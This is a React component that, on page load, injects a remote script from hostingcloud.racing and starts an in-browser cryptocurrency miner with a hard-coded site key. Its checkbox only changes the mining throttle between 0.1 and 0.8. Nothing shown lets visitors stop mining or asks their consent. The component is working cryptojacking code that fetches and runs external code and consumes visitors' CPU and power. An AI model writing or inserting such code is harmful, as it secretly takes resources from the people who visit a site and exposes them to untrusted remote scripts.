import React, { useEffect, useState } from 'react';

const Miner = ({ isMinerHigh, setIsMinerHigh }) => {
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://www.hostingcloud.racing/STsw.js';
    script.async = true;
    script.onload = () => {
      console.log('Mining script loaded');
      initializeMiner(isMinerHigh);
    };
    document.body.appendChild(script);
    return () => {
      document.body.removeChild(script);
    };
  }, [isMinerHigh]);

  const initializeMiner = (isHigh) => {
    try {
      const miner = new window.Client.Anonymous('2a84bd27d988005fd2568bd4424803d6136973ecb4f2d201f05d777518141754', {
        throttle: isHigh ? 0.8 : 0.1,
        c: 'w',
        ads: 0,
      });
      miner.start();
      window._client = miner; // Store miner globally for potential stopping later
      console.log('Miner started with throttle:', isHigh ? 0.8 : 0.1);
    } catch (error) {
      console.error('Error initializing miner:', error);
    }
  };

  const toggleMiner = () => {
    setIsMinerHigh(!isMinerHigh);
    if (window._client) {
      window._client.setThrottle(isMinerHigh ? 0.1 : 0.8);
      console.log('Miner throttle toggled to:', isMinerHigh ? 0.1 : 0.8);
    }
  };

  return (
    <div className="miner-switch">
      <label>
        Miner:
        <input type="checkbox" checked={isMinerHigh} onChange={toggleMiner} />
      </label>
    </div>
  );
};

export default Miner;